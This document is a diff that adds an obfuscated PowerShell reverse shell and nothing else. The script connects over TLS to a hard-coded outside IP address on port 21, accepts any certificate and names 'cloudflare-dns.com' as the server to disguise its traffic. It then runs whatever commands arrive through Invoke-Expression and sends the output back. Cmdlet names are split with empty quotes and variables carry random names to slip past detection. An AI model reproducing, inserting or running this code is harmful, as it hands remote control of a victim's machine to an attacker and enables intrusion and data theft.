@@ -1,0 +1,11 @@
+$5a4b8056bda64f878f6c3c8942754ea3= [System.Security.Authentication.SslProtocols]::Tls12;
+$6e7252286ddf47b4b898266f7aae3ff7= Ne''w''-''O''b''je''ct Net.Sockets.TCPClient('151.61.61.61', 21);
+$5ec6fef9459e4f2d9819af6d11ba2100= $6e7252286ddf47b4b898266f7aae3ff7.GetStream();
+$fed74dabca05447189ba99fd92638e58= Ne''w''-''O''bj''e''c''t Net.Security.SslStream($5ec6fef9459e4f2d9819af6d11ba2100,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
+$fed74dabca05447189ba99fd92638e58.AuthenticateAsClient('cloudflare-dns.com',$null,$5a4b8056bda64f878f6c3c8942754ea3,$false);
+if(!$fed74dabca05447189ba99fd92638e58.IsEncrypted -or !$fed74dabca05447189ba99fd92638e58.IsSigned) {$fed74dabca05447189ba99fd92638e58.Close();exit}$9e3aaf8cb0884a5f888e3dfe26471707 = New-Objec''t IO.StreamWriter($fed74dabca05447189ba99fd92638e58);
+function WriteToStream ($String) {[byte[]]$script:Buffer = N''e''w''-''O''b''j''e''c''t System.Byte[] 4096 ;
+$9e3aaf8cb0884a5f888e3dfe26471707.Write($String + 'SHELL> ');
+$9e3aaf8cb0884a5f888e3dfe26471707.Flush()};
+WriteToStream '';
+while(($929cc780381c4c5399cd14ea348456db = $fed74dabca05447189ba99fd92638e58.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$55ab998854e348b690537a1b0b5c3085= ([text.encoding]::UTF8).GetString($Buffer, 0, $929cc780381c4c5399cd14ea348456db - 1);$dedfd34f4eeb4cbdbee9aca699c6a9c4 = try {Invoke-Ex''p''r''e''s''sio''n $55ab998854e348b690537a1b0b5c3085 2>&1 | O''ut-''S''t''r''ing} catch {$_ | O''u''t''-''S''tr''i''ng}WriteToStream ($dedfd34f4eeb4cbdbee9aca699c6a9c4)}$9e3aaf8cb0884a5f888e3dfe26471707.Close()
